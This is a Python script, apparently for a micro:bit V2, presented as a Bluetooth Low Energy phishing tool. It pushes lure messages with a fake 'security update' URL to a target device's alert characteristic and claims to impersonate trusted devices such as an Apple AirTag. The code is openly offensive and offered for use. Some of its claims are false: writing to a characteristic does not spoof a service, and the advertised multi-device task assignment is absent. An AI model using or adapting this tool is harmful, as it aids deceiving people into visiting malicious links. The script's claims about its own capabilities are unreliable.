# microbit_ble_phishing.py

"""
BLE Phishing Attack for micro:bit V2 (Multi-Device Support)

This script performs BLE-based phishing attacks by sending fake notifications and mimicking trusted services.
- Detects available micro:bit devices and assigns tasks dynamically
- Sends phishing notifications with fake URLs (`--phish <target_mac> <message> <url>`)
- Spoofs a BLE service to trick users (`--spoof-service <target_mac> <service_name> <uuid>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Send a phishing BLE notification:
   ```sh
   python microbit_ble_phishing.py --phish AA:BB:CC:DD:EE:FF "Security Update Required" "https://fake-update.com"
   ```

2. Spoof a trusted BLE service:
   ```sh
   python microbit_ble_phishing.py --spoof-service AA:BB:CC:DD:EE:FF "Apple AirTag" "0000180F-0000-1000-8000-00805F9B34FB"
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# BLE Phishing Notification
async def ble_phish(target_mac, message, url):
    """Sends a fake BLE phishing notification with a malicious URL."""
    phishing_message = f"{message} - Click: {url}"
    print(f"[+] Sending phishing notification to {target_mac}: {phishing_message}")
    async with BleakClient(target_mac) as client:
        await client.write_gatt_char("00002a46-0000-1000-8000-00805f9b34fb", phishing_message.encode())
        print(f"[+] Phishing notification sent.")

# BLE Service Spoofing
async def ble_spoof_service(target_mac, service_name, uuid):
    """Spoofs a BLE service to impersonate a trusted device."""
    print(f"[+] Spoofing BLE service {service_name} ({uuid}) on {target_mac}...")
    async with BleakClient(target_mac) as client:
        await client.write_gatt_char(uuid, service_name.encode())
        print(f"[+] Service spoofed: {service_name} now appears on {target_mac}.")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Phishing Attack for micro:bit V2")
    parser.add_argument("--phish", nargs=3, metavar=("target_mac", "message", "url"), help="Send a phishing BLE notification with a fake URL")
    parser.add_argument("--spoof-service", nargs=3, metavar=("target_mac", "service_name", "uuid"), help="Spoof a BLE service to trick users")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.phish:
        loop.run_until_complete(ble_phish(args.phish[0], args.phish[1], args.phish[2]))
    elif args.spoof_service:
        loop.run_until_complete(ble_spoof_service(args.spoof_service[0], args.spoof_service[1], args.spoof_service[2]))
